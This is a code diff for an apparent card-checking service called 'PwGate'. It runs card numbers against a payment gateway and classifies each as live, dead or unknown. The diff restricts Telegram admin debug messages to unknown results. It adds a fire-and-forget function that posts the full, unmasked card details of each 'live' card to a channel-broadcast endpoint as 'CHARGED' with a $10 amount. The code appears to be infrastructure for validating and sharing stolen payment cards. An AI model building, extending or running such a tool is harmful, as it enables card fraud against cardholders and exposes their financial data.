@@ -93,8 +93,14 @@ const extractSmartMessage = (html: string, resultSuccess: number | undefined, ap
   return "Transaction processed";
 };
 
-// Send debug to admin via Telegram
+// Send debug to admin via Telegram - ONLY for UNKNOWN status
 const sendAdminDebug = async (cc: string, status: string, rawResponse: string, smartMessage: string) => {
+  // Only send debug for UNKNOWN results
+  if (status !== 'unknown') {
+    console.log(`[PWGATE] Skipping admin debug for ${status} status`);
+    return;
+  }
+  
   if (!TELEGRAM_BOT_TOKEN) {
     console.log('[PWGATE] No Telegram token - skipping admin debug');
     return;
@@ -112,9 +118,7 @@ const sendAdminDebug = async (cc: string, status: string, rawResponse: string, s
       rawResponse.substring(0, 3000) + '\n... [truncated]' : 
       rawResponse;
     
-    const statusEmoji = status === 'live' ? '💳' : status === 'dead' ? '❌' : '❓';
-    
-    const message = `${statusEmoji} <b>PwGate Debug</b>\n\n` +
+    const message = `❓ <b>PwGate Debug (UNKNOWN)</b>\n\n` +
       `<b>Card:</b> <code>${maskedCard}</code>\n` +
       `<b>Status:</b> ${status.toUpperCase()}\n` +
       `<b>Message:</b> ${smartMessage}\n\n` +
@@ -133,6 +137,36 @@ const sendAdminDebug = async (cc: string, status: string, rawResponse: string, s
   } catch (error) {
     console.error('[PWGATE] Failed to send admin debug:', error);
   }
+};
+
+// Notify charged card (fire-and-forget) - broadcasts to channel
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  // Fire and forget - don't await
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      userId,
+      cardDetails,
+      status,
+      responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[PWGATE] notify-charged-card error:", err));
 };
 
 // Call the PwGate API
@@ -303,8 +337,20 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
-    // Send debug to admin via Telegram (fire-and-forget)
+    // Send debug to admin via Telegram ONLY for UNKNOWN (fire-and-forget)
     sendAdminDebug(cc, result.status, result.rawResponse, result.message).catch(() => {});
+    
+    // Broadcast CHARGED cards to channel (fire-and-forget)
+    if (result.status === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        result.message,
+        '$10',
+        'PwGate'
+      );
+    }
     
     return new Response(
       JSON.stringify({
